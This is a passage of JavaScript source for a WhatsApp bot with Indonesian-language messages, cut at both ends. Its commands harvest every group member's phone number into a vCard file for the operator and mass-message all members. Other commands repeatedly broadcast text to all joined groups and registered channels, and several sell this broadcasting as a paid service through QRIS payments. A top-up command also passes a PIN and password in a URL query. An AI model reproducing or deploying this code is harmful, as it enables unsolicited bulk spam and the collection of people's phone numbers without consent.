if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await dwiaff.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await dwiaff.sendMessage(mem, {text: teks}, {quoted: qloc})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await dwiaff.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

case "savekontak1": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await dwiaff.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await dwiaff.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

case "savekontak": {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await dwiaff.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

case "jpm": {
if (!isCreator) return reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await dwiaff.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
await dwiaff.sendMessage(jid, {text: teks}, {quoted: qloc})
total += 1
} catch {}
await sleep(global.delayJpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case "jpmall": {
    if (!isCreator) return reply(mess.owner)
    if (!text && !m.quoted) return m.reply(example("teksnya atau reply teks"));
    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    let channels = global.channels || [];
    if (channels.length === 0) return m.reply("❌ *Tidak ada saluran terdaftar untuk JPM!*");

    m.reply(`
╔══════════════════════════╗
║      🚀 *JPMALL STARTED*      ║
╚══════════════════════════╝
⏳ *Proses pengiriman pesan dimulai...*
📡 *Target*: ${channels.length} Saluran
    `);

    // Kirim ke semua saluran dengan jeda
    for (let id of channels) {
        try {
            await dwiaff.sendMessage(id, { text: teks }, { quoted: qloc });
            total += 1;
        } catch (e) {
            console.log(`❌ Gagal mengirim ke saluran ${id}:`, e);
        }
        await sleep(global.delayjpmch); // Tambahkan jeda
    }

    m.reply(`
╔══════════════════════════╗
║     📡 *SALURAN SELESAI*     ║
╚══════════════════════════╝
✅ *Pesan telah dikirim ke ${total} saluran!*
🔄 *Lanjutkan ke grup...*
    `);

    // Kirim ke semua grup dengan jeda
    let getGroups = await dwiaff.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let usergc = groups.map((v) => v.id);

    let groupTotal = 0;
    for (let jid of usergc) {
        try {
            await dwiaff.sendMessage(jid, { text: teks }, { quoted: qloc });
            groupTotal += 1;
            total += 1;
        } catch (e) {
            console.log(`❌ Gagal mengirim ke grup ${jid}:`, e);
        }
        await sleep(global.delayJpm); // Tambahkan jeda
    }

    m.reply(`
╔══════════════════════════╗
║      🛡️ *GRUP SELESAI*       ║
╚══════════════════════════╝
✅ *Pesan telah dikirim ke ${groupTotal} grup!*
    `);

    m.reply(`
╔══════════════════════════╗
║    🎉 *JPMALL SELESAI*    ║
╚══════════════════════════╝
✨ *Total berhasil terkirim*: ${total} (Saluran & Grup)
🎯 *Semoga pesan ini bermanfaat untuk semua penerima!*
    `);
}
break;

case "addidchv2": {
    if (!isCreator) return reply(mess.owner)
    if (!text) return m.reply("example: .addidch linkch,linkch1");

    // Pisah link berdasarkan koma
    let links = text.split(",").map(link => link.trim()).filter(link => link.startsWith("https://whatsapp.com/channel/"));
    if (links.length === 0) return m.reply("Tidak ada link yang valid ditemukan!");

    global.channels = loadChannels();
    let added = [], skipped = [];

    for (let link of links) {
        let channelId = link.split("https://whatsapp.com/channel/")[1];
        if (!channelId) {
            skipped.push(link);
            continue;
        }

        try {
            let res = await dwiaff.newsletterMetadata("invite", channelId);
            if (!res.id) {
                skipped.push(link);
                continue;
            }

            if (global.channels.includes(res.id)) {
                skipped.push(link); // Sudah ada
            } else {
                global.channels.push(res.id);
                added.push(`✅ ${res.name} (ID: ${res.id})`);
            }
        } catch (e) {
            console.log(`Gagal memproses link: ${link}`, e);
            skipped.push(link);
        }
    }

    saveChannels(global.channels);

    let replyMsg = `*Hasil Penambahan Saluran:*\n\n`;
    if (added.length > 0) replyMsg += `*Berhasil Ditambahkan:*\n${added.join("\n")}\n\n`;
    if (skipped.length > 0) replyMsg += `*Dilewati (Sudah Ada / Invalid):*\n${skipped.join("\n")}`;

    m.reply(replyMsg);
}
break;

case "addidch": {
    if (!isCreator) return reply(mess.owner)
    if (!text) return m.reply("Harap masukkan link saluran!");

    let channelLink = text.trim();

    if (!channelLink.includes("https://whatsapp.com/channel/")) {
        return m.reply("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
    }

    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
    if (!channelId) return m.reply("Gagal mengekstrak ID dari link saluran!");

    try {
        let res = await dwiaff.newsletterMetadata("invite", channelId);

        if (!res.id) return m.reply("ID saluran tidak valid!");

        global.channels = loadChannels();

        if (global.channels.includes(res.id)) {
            return m.reply(`ID Saluran *${res.id}* sudah terdaftar!`);
        }

        global.channels.push(res.id);
        saveChannels(global.channels);

        m.reply(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
    } catch (e) {
        console.error(e);
        m.reply("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
    }
}
break;

case "delallidch": {
    if (!isCreator) return reply(mess.owner)

    global.channels = []; // Mengosongkan array saluran
    saveChannels(global.channels); // Menyimpan perubahan

    m.reply("Semua ID Saluran berhasil dihapus!");
}
break;
case "delidch": {
    if (!isCreator) return reply(mess.owner)
    if (!text) return m.reply("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels = loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (index < 0 || index >= global.channels.length) {
            return m.reply("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {
            return m.reply("ID Saluran tidak ditemukan!");
        }

        global.channels = global.channels.filter((id) => id !== channelId);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
}
break;

case "listidch": {
    if (!isCreator) return reply(mess.owner)

    global.channels = loadChannels();

    if (global.channels.length === 0) {
        return m.reply("Belum ada ID saluran yang terdaftar!");
    }

    let list = global.channels
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    m.reply(`Daftar ID Saluran Terdaftar:\n\n${list}`);
}
break;

case "jpmallch": {
     if (!isCreator) return m.reply("🚫 *Hanya Creator yang dapat menggunakan perintah ini!*");
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jpmch jumlah|jeda|teks`\n\n💡 *Contoh:* `jpmch 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jpmch jumlah|jeda|teks`\n\n💡 *Contoh:* `jpmch 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    global.channels = loadChannels(); // Fungsi untuk memuat daftar saluran

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    m.reply(
        `✨ *Memulai pengiriman pesan!* ✨\n\n` +
        `📤 *Jumlah Saluran:* ${global.channels.length}\n` +
        `📩 *Jumlah Pesan Total:* ${jumlah * global.channels.length}\n` +
        `⏳ *Jeda antar Iterasi:* ${jeda / 1000} detik.\n\n` +
        `⚙️ *Harap tunggu, proses sedang berjalan...*`
    );

    for (let i = 0; i < jumlah; i++) {
        const prosesPengiriman = global.channels.map(async (id) => {
            try {
                await dwiaff.sendMessage(id, { text: teks }, { quoted: m });
                totalBerhasil += 1;
            } catch (error) {
                console.error(`❌ Gagal mengirim ke ${id}:`, error);
                totalGagal += 1;
            }
        });

        // Tunggu semua pengiriman selesai di iterasi ini
        await Promise.all(prosesPengiriman);
        if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
    }

    m.reply(
        `✅ *Pengiriman selesai!*\n\n` +
        `📊 *Hasil Pengiriman:*\n` +
        `✔️ *Berhasil:* ${totalBerhasil} pesan\n` +
        `❌ *Gagal:* ${totalGagal} pesan\n\n` +
        `💼 *Powered by ᴅᴡɪᴀғғ Host!*`
    );
}
break;

case "jpmch": {  
    if (!isCreator) return reply(mess.owner)  
    if (!text && !m.quoted) return m.reply(example("Teksnya atau reply teks"));  
    var teks = m.quoted ? m.quoted.text : text;  
    let total = 0;  
  
    global.channels = loadChannels();  
  
    if (global.channels.length === 0)   
        return m.reply(`  
╔══════════════════════════╗  
        ❌ *SALAHAN* ❌  
╚══════════════════════════╝  
⚠️ Tidak ada saluran terdaftar untuk *JPM*!  
Silakan daftarkan saluran terlebih dahulu.  
`);  
  
    m.reply(`  
╭─❰ *PROCESSING MESSAGE* ❱─╮  
📬 *Mengirim Pesan Ke*:   
  ➥ *${global.channels.length} Saluran*  
⏳ *Mohon Tunggu...*  
╰─────────────────────╯  
    `);  
  
    for (let id of global.channels) {  
        try {  
            await dwiaff.sendMessage(id, { text: teks }, { quoted: m });  
            total += 1;  
        } catch (e) {  
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);  
        }  
        await sleep(global.delayjpmch); // jeda tiap pengiriman  
    }  
  
    m.reply(`  
╭─❰ *RESULT SUMMARY* ❱─╮  
🎉 *Pesan Terkirim*:   
  ➥ *${total} Saluran*  
✅ *Status*: Berhasil!  
📩 Terima kasih telah menggunakan layanan ini.  
╰─────────────────────╯  
    `);  
}  
break;

case 'topupsaldo':
if (!isCreator) return reply(mess.owner)
{
 try {
 const input = text.split('|'); 
 if (input.length !== 2) {
 return m.reply("❌ Format salah! Gunakan format: *.topupsaldo KODE|NOMOR_HP*");
 }

 const kode = input[0].trim().toUpperCase();
 const nomorHp = input[1].trim();
 if (!/^\d{10,15}$/.test(nomorHp)) {
 return m.reply("❌ Nomor HP tidak valid! Pastikan nomor terdiri dari 10-15 digit angka.");
 }

 const apiUrl = `https://h2h.okeconnect.com/trx`;
 const refID = Math.floor(Math.random() * 1000000);
 const memberID = `${merchantIdOrderKuota}`;
 const pin = `${pinOrkut}`;
 const password = `${pwOrkut}`;

 const https = require('https');
 const url = `${apiUrl}?product=${kode}&dest=${nomorHp}&refID=${refID}&memberID=${memberID}&pin=${pin}&password=${password}`;

 https.get(url, (res) => {
 let data = '';
 res.on('data', (chunk) => {
 data += chunk;
 });

 res.on('end', () => {

 if (data.startsWith("R#")) {

 const result = data.split(" ");
 const trxID = result[0];
 const statusMessage = result.slice(1).join(" ");
 m.reply(`✅ Pesanan berhasil diproses!\n\n*Detail Pesanan:*\n*Produk:* ${kode}\n*Nomor Tujuan:* ${nomorHp}\n*Status:* ${trxID}\n*Status:* ${statusMessage}`);
 } else {
 m.reply(`✅ Pesanan berhasil diproses!\n\n*Detail Pesanan:*\n*Produk:* ${kode}\n*Nomor Tujuan:* ${nomorHp}\n*Status:* Sukses.`);
 }
 });
 }).on('error', (err) => {
 console.error(`Error: ${err.message}`);
 m.reply("❌ Terjadi kesalahan saat memproses permintaan.");
 });
 } catch (error) {
 console.error(error);
 m.reply("❌ Terjadi kesalahan saat memproses permintaan.");
 }
}
break;

case 'daftarharga-ewallet': {
if (!isCreator) return reply(mess.owner)
 try {
 const apiUrl = `https://www.okeconnect.com/harga/json?id=905ccd028329b0a&produk=saldo_gojek`;

 const response = await fetch(apiUrl);
 const produk = await response.json();

 if (!produk || produk.length === 0) {
 return m.reply("❌ Tidak ada data produk yang tersedia.");
 }

 // Buat daftar harga
 let teks = "*Daftar Harga TopUp Ewallet💸*\n\n";
 produk.forEach(item => {
 teks += `*Kode:* ${item.kode}\n`;
 teks += `*Deskripsi:* ${item.keterangan}\n`;
 teks += `*Harga:* Rp${Number(item.harga).toLocaleString('id-ID')}\n`;
 teks += `-----------------------------\n`;
 });

 teks += "\nGunakan format berikut untuk pembelian:\n*.topupsaldo KODE|NOMOR_HP*\nContoh: *.topupsaldo GJK50|081234567890*";

 await m.reply(teks);
 } catch (error) {
 console.error(error);
 m.reply("❌ Gagal mengambil daftar harga. Silakan coba lagi nanti.");
 }
    }
 break;
 
case 'jasashare': {
if (!q) return m.reply(example("teks"))
  let teksHeader = `
ᴘɪʟɪʜ ʜᴀʀɢᴀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ

ᴛᴇxᴛ ᴀɴᴅᴀ : ${text} 

ᴊɪᴋᴀ ᴛᴇxᴛ ᴀɴᴅᴀ ᴋᴏsᴏɴɢ ᴋᴇᴛɪᴋ ᴊᴀsᴀ sʜᴀʀᴇ ᴜʟᴀɴɢ
  `;
dwiaff.sendMessage(m.chat, {
  text: teksHeader, 
  footer: "ᴄʀᴇᴀᴛᴏʀ ᴅᴡɪᴀғғx ツ",
  buttons: [
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'ᴘɪʟɪʜ ʜᴀʀɢᴀ',
        sections: [
{ title: "✨️ᴘɪʟɪʜ ʜᴀʀɢᴀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ✨️",  
rows: [{ title: "👑 𝟷 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch1x 1|10|${text}` },
{ title: "👑 𝟸 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch2x 2|300|${text}` },
{ title: "👑 𝟹 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch3x 3|300|${text}` }, 
{ title: "👑 𝟺 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch4x 4|300|${text}` },
{ title: "👑 𝟻 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch5x 5|300|${text}` },
{ title: "⚡️𝟼 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch6x 6|300|${text}` },
{ title: "⚡𝟽 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch7x 7|300|${text}` },
{ title: "⚡𝟾 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch8x 8|300|${text}` },
{ title: "⚡𝟿 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴇʟɪ ᴊᴀsᴀ sʜᴀʀᴇ", id: `.jasajpmch9x 9|300|${text}` },
{ title: "⚡ 𝟷𝟶 x ᴊᴀsʜᴀʀᴇ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴄᴘᴀɴᴇʟ 𝟷𝟶ɢʙ", id: `.jasajpmch10x 10|300|${text}` },
]}],
})},
}],
headerType: 1,
viewOnce: true
}, { quoted: m });
}
break;

case "jasajpmch1x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 3000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch2x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 6000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch3x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 9000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
